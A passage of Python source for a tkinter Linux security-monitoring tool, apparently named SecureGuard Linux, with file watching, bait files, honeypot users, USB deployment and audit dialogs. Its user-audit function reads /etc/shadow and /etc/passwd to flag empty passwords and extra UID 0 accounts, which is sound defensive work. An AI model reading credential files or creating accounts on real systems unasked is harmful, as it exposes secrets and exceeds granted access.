        usb_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(usb_control_frame, text="Setup USB Deployment", 
                  command=self.setup_usb_deployment).pack(side=tk.LEFT, padx=5)
        ttk.Button(usb_control_frame, text="Verify USB Integrity", 
                  command=self.verify_usb_integrity).pack(side=tk.LEFT, padx=5)
        ttk.Button(usb_control_frame, text="Export Profile", 
                  command=self.export_profile).pack(side=tk.LEFT, padx=5)
        ttk.Button(usb_control_frame, text="Import Profile", 
                  command=self.import_profile).pack(side=tk.LEFT, padx=5)
        
        # USB info
        usb_info_frame = ttk.LabelFrame(self.usb_frame, text="USB Information")
        usb_info_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.usb_info_text = scrolledtext.ScrolledText(usb_info_frame,
                                                     bg="#2d2d2d", fg=self.fg_color,
                                                     insertbackground=self.fg_color)
        self.usb_info_text.pack(fill=tk.BOTH, expand=True)
        
        # Portable mode controls
        portable_frame = ttk.LabelFrame(self.usb_frame, text="Portable Mode")
        portable_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.var_portable_mode = tk.BooleanVar(value=False)
        ttk.Checkbutton(portable_frame, text="Enable Portable Mode", 
                       variable=self.var_portable_mode,
                       command=self.toggle_portable_mode).pack(side=tk.LEFT, padx=5)
        
    def setup_logs_tab(self):
        """Setup logs tab"""
        # Log controls
        log_control_frame = ttk.LabelFrame(self.logs_frame, text="Log Controls")
        log_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(log_control_frame, text="Clear Logs", 
                  command=self.clear_logs).pack(side=tk.LEFT, padx=5)
        ttk.Button(log_control_frame, text="Save Logs", 
                  command=self.save_logs).pack(side=tk.LEFT, padx=5)
        ttk.Button(log_control_frame, text="Export Logs", 
                  command=self.export_logs).pack(side=tk.LEFT, padx=5)
        
        # Log display
        log_frame = ttk.LabelFrame(self.logs_frame, text="System Logs")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame,
                                                bg="#1a1a1a", fg=self.fg_color,
                                                insertbackground=self.fg_color,
                                                font=('Monospace', 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Log level filter
        filter_frame = ttk.Frame(log_frame)
        filter_frame.pack(fill=tk.X)
        
        ttk.Label(filter_frame, text="Filter:").pack(side=tk.LEFT, padx=5)
        self.log_filter_var = tk.StringVar(value="ALL")
        ttk.Radiobutton(filter_frame, text="All", variable=self.log_filter_var, 
                       value="ALL").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(filter_frame, text="Info", variable=self.log_filter_var, 
                       value="INFO").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(filter_frame, text="Warning", variable=self.log_filter_var, 
                       value="WARNING").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(filter_frame, text="Error", variable=self.log_filter_var, 
                       value="ERROR").pack(side=tk.LEFT, padx=2)
        
    def setup_menu(self):
        """Setup menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="New Profile", command=self.profile_system)
        file_menu.add_command(label="Save Profile", command=self.save_profile)
        file_menu.add_command(label="Load Profile", command=self.load_profile)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Network Scanner", command=self.network_scan)
        tools_menu.add_command(label="Process Explorer", command=self.process_explorer)
        tools_menu.add_command(label="File Integrity Check", command=self.file_integrity_check)
        tools_menu.add_command(label="Security Audit", command=self.security_audit)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="User Guide", command=self.show_guide)
        help_menu.add_command(label="About", command=self.show_about)
        
    def setup_modes_panel(self):
        """Setup modes control panel"""
        # This would be a sidebar or panel with different modes
        # For now, implement as part of monitoring tab
        pass
        
    def check_usb_mode(self):
        """Check if running in USB mode"""
        usb_path = os.environ.get('SECUREGUARD_PATH')
        if usb_path and os.path.exists(usb_path):
            self.usb_mode = True
            self.usb_deployment.usb_path = usb_path
            self.usb_mode_label.config(text=f"USB Mode: {usb_path}")
            logger.info(f"Running in USB mode from {usb_path}")
    
    def update_system_stats(self):
        """Update system statistics display"""
        try:
            # CPU usage
            cpu_percent = psutil.cpu_percent(interval=1)
            self.cpu_label.config(text=f"CPU: {cpu_percent}%")
            
            # Memory usage
            memory = psutil.virtual_memory()
            self.memory_label.config(text=f"Memory: {memory.percent}% ({memory.used//1024**2}MB/{memory.total//1024**2}MB)")
            
            # Disk usage (root)
            disk = psutil.disk_usage('/')
            self.disk_label.config(text=f"Disk (root): {disk.percent}%")
            
            # Process count
            process_count = len(psutil.pids())
            self.process_label.config(text=f"Processes: {process_count}")
            
            # Update hardware info if available
            if self.current_profile:
                hw_info = self.current_profile.get('hardware', {})
                cpu_info = hw_info.get('cpu', {})
                if cpu_info:
                    cpu_str = f"CPU: {cpu_info.get('model name', 'Unknown')}\n"
                    cpu_str += f"Cores: {cpu_info.get('count', '?')}\n"
                    self.hw_text.delete(1.0, tk.END)
                    self.hw_text.insert(tk.END, cpu_str)
            
        except Exception as e:
            logger.error(f"Error updating stats: {e}")
        
        # Schedule next update
        self.root.after(2000, self.update_system_stats)
    
    def update_logs(self):
        """Update log display from queue"""
        try:
            while not log_queue.empty():
                record = log_queue.get_nowait()
                
                # Apply filter
                if self.log_filter_var.get() != "ALL" and record.levelname != self.log_filter_var.get():
                    continue
                
                # Color code based on level
                tag = record.levelname
                self.log_text.insert(tk.END, record.getMessage() + '\n', tag)
                
                # Apply tag colors
                if record.levelname == 'ERROR':
                    self.log_text.tag_config('ERROR', foreground='#ff6b6b')
                elif record.levelname == 'WARNING':
                    self.log_text.tag_config('WARNING', foreground='#ffd43b')
                elif record.levelname == 'INFO':
                    self.log_text.tag_config('INFO', foreground='#51cf66')
                
                # Auto-scroll
                self.log_text.see(tk.END)
                
        except queue.Empty:
            pass
        
        # Schedule next update
        self.root.after(100, self.update_logs)
    
    def start_watching(self):
        """Start system watching"""
        if self.watching:
            messagebox.showinfo("Info", "Already watching")
            return
        
        # Get directories to watch
        directories = []
        for i in range(self.dir_listbox.size()):
            directories.append(self.dir_listbox.get(i))
        
        if not directories:
            directories = [os.path.expanduser("~"), "/tmp"]
        
        # Start the watcher in a separate thread
        def watch_thread():
            try:
                self.system_watcher.start_watching(directories=directories)
                self.watching = True
                logger.info("System watching started")
            except Exception as e:
                logger.error(f"Failed to start watching: {e}")
        
        threading.Thread(target=watch_thread, daemon=True).start()
        
        # Update monitor display
        self.monitor_text.insert(tk.END, f"[{datetime.now()}] Started watching {len(directories)} directories\n")
        self.monitor_text.see(tk.END)
    
    def stop_watching(self):
        """Stop system watching"""
        self.system_watcher.stop_watching()
        self.watching = False
        logger.info("System watching stopped")
        self.monitor_text.insert(tk.END, f"[{datetime.now()}] Stopped watching\n")
    
    def profile_system(self):
        """Profile the system"""
        def profile_thread():
            try:
                self.monitor_text.insert(tk.END, f"[{datetime.now()}] Starting system profiling...\n")
                
                self.current_profile = self.hardware_profiler.profile_system()
                
                # Update display
                self.hw_text.delete(1.0, tk.END)
                if self.current_profile:
                    # Show basic info
                    system_info = self.current_profile.get('system', {})
                    hw_info = self.current_profile.get('hardware', {})
                    
                    info_str = f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
                    info_str += f"Kernel: {system_info.get('kernel', 'Unknown')}\n"
                    info_str += f"Distribution: {system_info.get('distribution', {}).get('PRETTY_NAME', 'Unknown')}\n"
                    info_str += f"CPU Cores: {hw_info.get('cpu', {}).get('count', '?')}\n"
                    info_str += f"Memory: {hw_info.get('memory', {}).get('MemTotal', '?')}\n"
                    
                    self.hw_text.insert(tk.END, info_str)
                    
                    # Update security status
                    self.update_security_status()
                    
                    self.monitor_text.insert(tk.END, f"[{datetime.now()}] System profiling completed\n")
                    logger.info(f"System profile created: {system_info.get('hostname')}")
                    
                    # Save profile automatically
                    self.save_profile_auto()
            except Exception as e:
                logger.error(f"Profiling failed: {e}")
                self.monitor_text.insert(tk.END, f"[{datetime.now()}] Profiling failed: {e}\n")
        
        threading.Thread(target=profile_thread, daemon=True).start()
    
    def update_security_status(self):
        """Update security status display"""
        if not self.current_profile:
            return
        
        security = self.current_profile.get('security', {})
        sec_text = ""
        
        # Firewall
        fw_status = security.get('firewall', {})
        if fw_status.get('ufw') or fw_status.get('firewalld') or fw_status.get('iptables'):
            sec_text += "✓ Firewall: Active\n"
        else:
            sec_text += "✗ Firewall: Not active\n"
        
        # Updates
        updates = security.get('updates', {})
        if updates.get('updates_available') == True:
            sec_text += "⚠ Updates: Available\n"
        else:
            sec_text += "✓ Updates: Up to date\n"
        
        # SELinux/AppArmor
        if security.get('selinux') and security.get('selinux') != 'disabled':
            sec_text += f"✓ SELinux: {security.get('selinux')}\n"
        elif security.get('apparmor'):
            sec_text += "✓ AppArmor: Active\n"
        else:
            sec_text += "✗ MAC: Not active\n"
        
        # SSH config
        ssh_config = security.get('ssh_config', {})
        if ssh_config:
            sec_text += f"✓ SSH Config: {len(ssh_config)} files found\n"
        
        self.sec_text.delete(1.0, tk.END)
        self.sec_text.insert(tk.END, sec_text)
    
    def deploy_bait_system(self):
        """Deploy bait system"""
        bait_dir = self.bait_dir_var.get()
        
        def deploy_thread():
            try:
                self.monitor_text.insert(tk.END, f"[{datetime.now()}] Deploying bait system to {bait_dir}...\n")
                
                self.bait_system = LinuxBaitSystem(base_dir=bait_dir)
                
                self.bait_status_text.delete(1.0, tk.END)
                self.bait_status_text.insert(tk.END, f"Bait system deployed to: {bait_dir}\n")
                self.bait_status_text.insert(tk.END, f"Bait files created: {len(self.bait_system.bait_files)}\n")
                self.bait_status_text.insert(tk.END, f"Bait services: {len(self.bait_system.bait_processes)}\n")
                self.bait_status_text.insert(tk.END, f"Watchers: {len(self.bait_system.watchers)}\n")
                
                self.monitor_text.insert(tk.END, f"[{datetime.now()}] Bait system deployed\n")
                logger.info(f"Bait system deployed to {bait_dir}")
            except Exception as e:
                logger.error(f"Bait deployment failed: {e}")
                self.monitor_text.insert(tk.END, f"[{datetime.now()}] Bait deployment failed: {e}\n")
        
        threading.Thread(target=deploy_thread, daemon=True).start()
    
    def check_bait_triggers(self):
        """Check for bait triggers"""
        if not self.bait_system:
            messagebox.showwarning("Warning", "Bait system not deployed")
            return
        
        triggers = self.bait_system.check_bait_triggers()
        
        self.bait_status_text.delete(1.0, tk.END)
        if triggers:
            self.bait_status_text.insert(tk.END, "🚨 BAIT TRIGGERS DETECTED:\n")
            for trigger in triggers:
                self.bait_status_text.insert(tk.END, f"  • {trigger}\n")
            logger.warning(f"Bait triggers detected: {len(triggers)}")
        else:
            self.bait_status_text.insert(tk.END, "✓ No bait triggers detected\n")
            logger.info("No bait triggers detected")
    
    def create_honeypot_users(self):
        """Create honeypot users"""
        if not self.bait_system:
            messagebox.showwarning("Warning", "Bait system not deployed")
            return
        
        users = self.bait_system.create_honeypot_users()
        
        self.bait_status_text.delete(1.0, tk.END)
        self.bait_status_text.insert(tk.END, "Honeypot users created (for monitoring):\n")
        for user in users:
            self.bait_status_text.insert(tk.END, f"  • {user['username']}\n")
        
        logger.info(f"Honeypot users created: {len(users)}")
    
    def setup_usb_deployment(self):
        """Setup USB deployment"""
        # Ask for USB path
        usb_path = filedialog.askdirectory(title="Select USB Drive Location")
        if not usb_path:
            return
        
        self.usb_deployment.usb_path = usb_path
        
        def setup_thread():
            try:
                self.usb_info_text.delete(1.0, tk.END)
                self.usb_info_text.insert(tk.END, f"Setting up USB deployment at: {usb_path}\n")
                self.usb_info_text.insert(tk.END, "This may take a few minutes...\n")
                self.usb_info_text.update()
                
                success = self.usb_deployment.setup_usb_deployment()
                
                if success:
                    self.usb_info_text.insert(tk.END, "✓ USB deployment setup complete!\n")
                    self.usb_info_text.insert(tk.END, f"Launcher: {usb_path}/run_secureguard.sh\n")
                    self.usb_info_text.insert(tk.END, f"Packages: {usb_path}/linux_packages/\n")
                    
                    # Update USB mode
                    self.usb_mode = True
                    self.usb_mode_label.config(text=f"USB Mode: {usb_path}")
                    
                    logger.info(f"USB deployment setup complete at {usb_path}")
                else:
                    self.usb_info_text.insert(tk.END, "✗ USB deployment failed\n")
                    logger.error("USB deployment failed")
                    
            except Exception as e:
                self.usb_info_text.insert(tk.END, f"Error: {e}\n")
                logger.error(f"USB setup error: {e}")
        
        threading.Thread(target=setup_thread, daemon=True).start()
    
    def verify_usb_integrity(self):
        """Verify USB deployment integrity"""
        result = self.usb_deployment.verify_integrity()
        
        self.usb_info_text.delete(1.0, tk.END)
        self.usb_info_text.insert(tk.END, f"USB Path: {result['usb_path']}\n")
        self.usb_info_text.insert(tk.END, f"Valid: {'✓' if result['valid'] else '✗'}\n")
        self.usb_info_text.insert(tk.END, f"Free Space: {result['free_space'] // (1024**2)} MB\n")
        
        self.usb_info_text.insert(tk.END, "\nChecks:\n")
        for check, status in result['checks'].items():
            self.usb_info_text.insert(tk.END, f"  {check}: {'✓' if status else '✗'}\n")
        
        self.usb_info_text.insert(tk.END, "\nPermissions:\n")
        perms = result['permissions']
        self.usb_info_text.insert(tk.END, f"  Readable: {'✓' if perms['readable'] else '✗'}\n")
        self.usb_info_text.insert(tk.END, f"  Writable: {'✓' if perms['writable'] else '✗'}\n")
        self.usb_info_text.insert(tk.END, f"  Executable: {'✓' if perms['executable'] else '✗'}\n")
    
    def toggle_portable_mode(self):
        """Toggle portable mode"""
        if self.var_portable_mode.get():
            logger.info("Portable mode enabled")
        else:
            logger.info("Portable mode disabled")
    
    def add_directory(self, directory=None):
        """Add directory to watch list"""
        if not directory:
            directory = filedialog.askdirectory(title="Select Directory to Watch")
            if not directory:
                return
        
        if directory not in self.dir_listbox.get(0, tk.END):
            self.dir_listbox.insert(tk.END, directory)
            logger.info(f"Added directory to watch: {directory}")
    
    def remove_directory(self):
        """Remove selected directory from watch list"""
        selection = self.dir_listbox.curselection()
        if selection:
            directory = self.dir_listbox.get(selection[0])
            self.dir_listbox.delete(selection[0])
            logger.info(f"Removed directory from watch: {directory}")
    
    def browse_bait_dir(self):
        """Browse for bait directory"""
        directory = filedialog.askdirectory(title="Select Bait Directory")
        if directory:
            self.bait_dir_var.set(directory)
    
    def clear_logs(self):
        """Clear log display"""
        self.log_text.delete(1.0, tk.END)
        logger.info("Logs cleared")
    
    def save_logs(self):
        """Save logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.log_text.get(1.0, tk.END))
                logger.info(f"Logs saved to {filename}")
            except Exception as e:
                logger.error(f"Failed to save logs: {e}")
    
    def export_logs(self):
        """Export logs in structured format"""
        if not self.system_watcher.activity_log:
            messagebox.showinfo("Info", "No activity logs to export")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if filename:
            try:
                summary = self.system_watcher.get_activity_summary()
                with open(filename, 'w') as f:
                    json.dump(summary, f, indent=2, default=str)
                logger.info(f"Logs exported to {filename}")
            except Exception as e:
                logger.error(f"Failed to export logs: {e}")
    
    def save_profile_auto(self):
        """Save profile automatically"""
        if not self.current_profile:
            return
        
        try:
            # Save to profiles directory
            profiles_dir = "profiles"
            if self.usb_mode:
                profiles_dir = os.path.join(self.usb_deployment.usb_path, "profiles")
            
            os.makedirs(profiles_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(profiles_dir, f"profile_{timestamp}.json")
            
            with open(filename, 'w') as f:
                json.dump(self.current_profile, f, indent=2, default=str)
            
            logger.info(f"Profile auto-saved to {filename}")
        except Exception as e:
            logger.error(f"Failed to auto-save profile: {e}")
    
    def save_profile(self):
        """Save profile to file"""
        if not self.current_profile:
            messagebox.showwarning("Warning", "No profile to save")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.current_profile, f, indent=2, default=str)
                logger.info(f"Profile saved to {filename}")
            except Exception as e:
                logger.error(f"Failed to save profile: {e}")
    
    def load_profile(self):
        """Load profile from file"""
        filename = filedialog.askopenfilename(
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'r') as f:
                    self.current_profile = json.load(f)
                
                # Update displays
                self.update_security_status()
                
                logger.info(f"Profile loaded from {filename}")
            except Exception as e:
                logger.error(f"Failed to load profile: {e}")
    
    def export_profile(self):
        """Export profile to USB"""
        if not self.current_profile:
            messagebox.showwarning("Warning", "No profile to export")
            return
        
        if not self.usb_mode:
            messagebox.showwarning("Warning", "Not in USB mode")
            return
        
        try:
            profiles_dir = os.path.join(self.usb_deployment.usb_path, "profiles")
            os.makedirs(profiles_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(profiles_dir, f"profile_export_{timestamp}.json")
            
            with open(filename, 'w') as f:
                json.dump(self.current_profile, f, indent=2, default=str)
            
            self.usb_info_text.insert(tk.END, f"Profile exported to USB: {filename}\n")
            logger.info(f"Profile exported to USB: {filename}")
        except Exception as e:
            logger.error(f"Failed to export profile: {e}")
    
    def import_profile(self):
        """Import profile from USB"""
        if not self.usb_mode:
            messagebox.showwarning("Warning", "Not in USB mode")
            return
        
        profiles_dir = os.path.join(self.usb_deployment.usb_path, "profiles")
        if not os.path.exists(profiles_dir):
            messagebox.showwarning("Warning", "No profiles directory on USB")
            return
        
        # List profiles
        profiles = [f for f in os.listdir(profiles_dir) if f.endswith('.json')]
        if not profiles:
            messagebox.showinfo("Info", "No profiles found on USB")
            return
        
        # Simple selection dialog
        import_dialog = tk.Toplevel(self.root)
        import_dialog.title("Import Profile from USB")
        import_dialog.geometry("400x300")
        import_dialog.configure(bg=self.bg_color)
        
        ttk.Label(import_dialog, text="Select profile to import:").pack(pady=10)
        
        listbox = tk.Listbox(import_dialog, bg="#2d2d2d", fg=self.fg_color,
                           selectbackground=self.accent_color)
        listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        for profile in profiles:
            listbox.insert(tk.END, profile)
        
        def do_import():
            selection = listbox.curselection()
            if selection:
                profile_file = os.path.join(profiles_dir, listbox.get(selection[0]))
                try:
                    with open(profile_file, 'r') as f:
                        self.current_profile = json.load(f)
                    
                    self.update_security_status()
                    logger.info(f"Profile imported from USB: {profile_file}")
                    import_dialog.destroy()
                except Exception as e:
                    logger.error(f"Failed to import profile: {e}")
        
        ttk.Button(import_dialog, text="Import", command=do_import).pack(pady=10)
    
    def emergency_lock(self):
        """Emergency lock system"""
        response = messagebox.askyesno("Emergency Lock", 
                                      "This will lock down monitoring and clear sensitive data.\nContinue?")
        if response:
            # Stop all monitoring
            self.stop_watching()
            
            # Clear sensitive data
            if self.bait_system:
                self.bait_system = None
            
            # Clear logs
            self.log_text.delete(1.0, tk.END)
            self.monitor_text.delete(1.0, tk.END)
            
            logger.warning("EMERGENCY LOCK ACTIVATED")
            messagebox.showinfo("Emergency Lock", "System locked down")
    
    def generate_report(self):
        """Generate security report"""
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'system': self.current_profile.get('system', {}) if self.current_profile else {},
            'security_status': self.get_security_summary(),
            'activity_summary': self.system_watcher.get_activity_summary() if hasattr(self.system_watcher, 'get_activity_summary') else {},
            'bait_triggers': self.bait_system.check_bait_triggers() if self.bait_system else [],
            'usb_status': self.usb_deployment.verify_integrity() if self.usb_mode else None
        }
        
        # Save report
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(report_data, f, indent=2, default=str)
                logger.info(f"Report generated: {filename}")
            except Exception as e:
                logger.error(f"Failed to generate report: {e}")
    
    def get_security_summary(self):
        """Get security summary"""
        if not self.current_profile:
            return {}
        
        security = self.current_profile.get('security', {})
        summary = {
            'firewall_active': any(security.get('firewall', {}).values()),
            'updates_available': security.get('updates', {}).get('updates_available', False),
            'selinux_status': security.get('selinux', 'unknown'),
            'apparmor_status': security.get('apparmor', False),
            'ssh_config_exists': bool(security.get('ssh_config', {})),
            'sudoers_exists': bool(security.get('sudoers', ''))
        }
        return summary
    
    def network_scan(self):
        """Network scanner tool"""
        scan_dialog = tk.Toplevel(self.root)
        scan_dialog.title("Network Scanner")
        scan_dialog.geometry("600x400")
        scan_dialog.configure(bg=self.bg_color)
        
        ttk.Label(scan_dialog, text="Network Scanner", font=('Arial', 14)).pack(pady=10)
        
        scan_text = scrolledtext.ScrolledText(scan_dialog, height=15,
                                            bg="#1a1a1a", fg=self.fg_color)
        scan_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        def do_scan():
            scan_text.insert(tk.END, "Scanning network interfaces...\n")
            try:
                # Get network info
                interfaces = netifaces.interfaces()
                for iface in interfaces:
                    scan_text.insert(tk.END, f"\nInterface: {iface}\n")
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            scan_text.insert(tk.END, f"  IP: {addr['addr']}\n")
                            scan_text.insert(tk.END, f"  Netmask: {addr['netmask']}\n")
                    if netifaces.AF_LINK in addrs:
                        for addr in addrs[netifaces.AF_LINK]:
                            scan_text.insert(tk.END, f"  MAC: {addr['addr']}\n")
            except Exception as e:
                scan_text.insert(tk.END, f"Error: {e}\n")
        
        ttk.Button(scan_dialog, text="Start Scan", command=do_scan).pack(pady=10)
    
    def process_explorer(self):
        """Process explorer tool"""
        proc_dialog = tk.Toplevel(self.root)
        proc_dialog.title("Process Explorer")
        proc_dialog.geometry("800x600")
        proc_dialog.configure(bg=self.bg_color)
        
        # Treeview for processes
        tree = ttk.Treeview(proc_dialog, columns=('PID', 'Name', 'User', 'CPU%', 'Memory%'))
        tree.heading('#0', text='#')
        tree.heading('PID', text='PID')
        tree.heading('Name', text='Name')
        tree.heading('User', text='User')
        tree.heading('CPU%', text='CPU%')
        tree.heading('Memory%', text='Memory%')
        
        tree.column('#0', width=50)
        tree.column('PID', width=80)
        tree.column('Name', width=200)
        tree.column('User', width=100)
        tree.column('CPU%', width=80)
        tree.column('Memory%', width=80)
        
        scrollbar = ttk.Scrollbar(proc_dialog, orient="vertical", command=tree.yview)
        tree.configure(yscrollcommand=scrollbar.set)
        
        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        def refresh_processes():
            # Clear tree
            for item in tree.get_children():
                tree.delete(item)
            
            # Get processes
            try:
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                    try:
                        processes.append(proc.info)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                # Sort by CPU usage
                processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
                
                # Add to tree
                for i, proc in enumerate(processes[:50]):  # Show top 50
                    tree.insert('', 'end', text=str(i+1), values=(
                        proc['pid'],
                        proc['name'][:30],
                        proc['username'][:15] if proc['username'] else 'N/A',
                        f"{proc.get('cpu_percent', 0):.1f}",
                        f"{proc.get('memory_percent', 0):.1f}"
                    ))
                    
            except Exception as e:
                logger.error(f"Process explorer error: {e}")
        
        refresh_button = ttk.Button(proc_dialog, text="Refresh", command=refresh_processes)
        refresh_button.pack(pady=5)
        
        # Initial refresh
        refresh_processes()
    
    def file_integrity_check(self):
        """File integrity checker"""
        fid_dialog = tk.Toplevel(self.root)
        fid_dialog.title("File Integrity Check")
        fid_dialog.geometry("500x400")
        fid_dialog.configure(bg=self.bg_color)
        
        ttk.Label(fid_dialog, text="Check file integrity (MD5/SHA256)").pack(pady=10)
        
        file_path = tk.StringVar()
        ttk.Entry(fid_dialog, textvariable=file_path, width=50).pack(pady=5)
        
        ttk.Button(fid_dialog, text="Browse", 
                  command=lambda: file_path.set(filedialog.askopenfilename())).pack(pady=5)
        
        result_text = scrolledtext.ScrolledText(fid_dialog, height=10,
                                              bg="#1a1a1a", fg=self.fg_color)
        result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        def calculate_hash():
            path = file_path.get()
            if not os.path.exists(path):
                result_text.insert(tk.END, "File does not exist\n")
                return
            
            try:
                # Calculate MD5
                md5_hash = hashlib.md5()
                sha256_hash = hashlib.sha256()
                
                with open(path, 'rb') as f:
                    for chunk in iter(lambda: f.read(4096), b''):
                        md5_hash.update(chunk)
                        sha256_hash.update(chunk)
                
                result_text.delete(1.0, tk.END)
                result_text.insert(tk.END, f"File: {path}\n")
                result_text.insert(tk.END, f"Size: {os.path.getsize(path)} bytes\n")
                result_text.insert(tk.END, f"MD5: {md5_hash.hexdigest()}\n")
                result_text.insert(tk.END, f"SHA256: {sha256_hash.hexdigest()}\n")
                
            except Exception as e:
                result_text.insert(tk.END, f"Error: {e}\n")
        
        ttk.Button(fid_dialog, text="Calculate Hash", command=calculate_hash).pack(pady=10)
    
    def security_audit(self):
        """Security audit tool"""
        audit_dialog = tk.Toplevel(self.root)
        audit_dialog.title("Security Audit")
        audit_dialog.geometry("700x500")
        audit_dialog.configure(bg=self.bg_color)
        
        notebook = ttk.Notebook(audit_dialog)
        notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Tab 1: User audit
        user_frame = ttk.Frame(notebook)
        notebook.add(user_frame, text="Users")
        
        user_text = scrolledtext.ScrolledText(user_frame, height=10,
                                            bg="#1a1a1a", fg=self.fg_color)
        user_text.pack(fill=tk.BOTH, expand=True)
        
        def audit_users():
            user_text.delete(1.0, tk.END)
            try:
                # Check for users without passwords
                with open('/etc/shadow', 'r') as f:
                    for line in f:
                        if '::' in line:  # Empty password field
                            user = line.split(':')[0]
                            user_text.insert(tk.END, f"User without password: {user}\n")
                
                # Check for UID 0 users (other than root)
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        parts = line.split(':')
                        if parts[2] == '0' and parts[0] != 'root':
                            user_text.insert(tk.END, f"User with UID 0: {parts[0]}\n")
                
            except Exception as e:
                user_text.insert(tk.END, f"Error: {e}\n")
        
        ttk.Button(user_frame, text="Audit Users", command=audit_users).pack(pady=5)
        
        # Tab 2: File permissions
        perm_frame = ttk.Frame(notebook)
        notebook.add(perm_frame, text="Permissions")
        
        perm_text = scrolledtext.ScrolledText(perm_frame, height=10,
                                            bg="#1a1a1a", fg=self.fg_color)
        perm_text.pack(fill=tk.BOTH, expand=True)
        
        def audit_permissions():
            perm_text.delete(1.0, tk.END)
            try:
                # Check critical file permissions
                critical_files = [
                    '/etc/passwd',
                    '/etc/shadow',
                    '/etc/sudoers'
                ]
                
                for file_path in critical_files:
                    if os.path.exists(file_path):
                        stat_info = os.stat(file_path)
                        perm = oct(stat_info.st_mode)[-3:]
                        perm_text.insert(tk.END, f"{file_path}: {perm}\n")
                
            except Exception as e:
                perm_text.insert(tk.END, f"Error: {e}\n")
        
        ttk.Button(perm_frame, text="Audit Permissions", command=audit_permissions).pack(pady=5)
    
    def show_guide(self):
        """Show user guide"""
        guide_text = """SecureGuard Linux - User Guide

QUICK START:
1. Start by profiling your system (Dashboard tab)
2. Setup monitoring directories (Monitoring tab)
3. Deploy bait system for intrusion detection (Bait System tab)
4. Setup USB deployment for portable security (USB Mode tab)

KEY FEATURES:
- Real-time file system monitoring with inotify
- Process and network connection tracking
- Bait files and honeypot users for intrusion detection
- Hardware-bound encryption for sensitive data
- USB portable mode for offline security audits
- Comprehensive system profiling and reporting

SECURITY TIPS:
- Always run from USB for maximum security
- Deploy bait files in sensitive directories
- Monitor system logs regularly
- Use hardware-bound encryption for passwords
- Generate regular security reports

TROUBLESHOOTING:
- If monitoring stops, check system resources
- Ensure you have permissions for monitored directories
- Check logs for detailed error information
- Verify USB integrity before critical operations

For more information, see the documentation in the docs/ directory.
"""
        
        guide_dialog = tk.Toplevel(self.root)
        guide_dialog.title("User Guide")
        guide_dialog.geometry("600x500")
        guide_dialog.configure(bg=self.bg_color)
        
        text = scrolledtext.ScrolledText(guide_dialog, bg="#1a1a1a", fg=self.fg_color)
        text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text.insert(tk.END, guide_text)
        text.config(state=tk.DISABLED)
    
    def show_about(self):
        """Show about dialog"""
        about_text = f"""SecureGuard Linux v3.0

Comprehensive Security Monitoring System for Linux

Features:
- System profiling and fingerprinting
- Real-time monitoring (files, processes, network)
- Bait system and honeypot deployment
- USB portable mode
- Hardware-bound encryption
- Security auditing and reporting

Platform: {platform.platform()}
Python: {platform.python_version()}
User: {getpass.getuser()}
Host: {platform.node()}

Copyright © 2024 Security Operations
This software is for authorized security testing only.
"""
        
        messagebox.showinfo("About SecureGuard Linux", about_text)
    
    def run(self):
        """Run the application"""
        self.root.mainloop()

def main():
    """Main entry point"""
    try:
        # Check if running as root
        if os.geteuid() == 0:
            response = input("Warning: Running as root. Continue? (y/N): ")
            if response.lower() != 'y':
                sys.exit(1)
        
        # Create and run GUI
        app = SecureGuardLinuxGUI()
        app.run()
        
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
    except Exception as e:
        print(f"Fatal error: {e}")
